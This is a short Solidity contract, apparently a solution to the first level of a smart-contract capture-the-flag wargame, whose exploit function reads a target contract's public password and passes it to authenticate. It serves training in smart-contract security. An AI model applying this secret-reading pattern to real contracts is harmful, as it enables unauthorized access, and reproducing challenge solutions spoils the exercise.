// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/level00.sol";

contract Attacker {
    function exploit(address instance) external {
        Instance(instance).authenticate(Instance(instance).password());
    }
}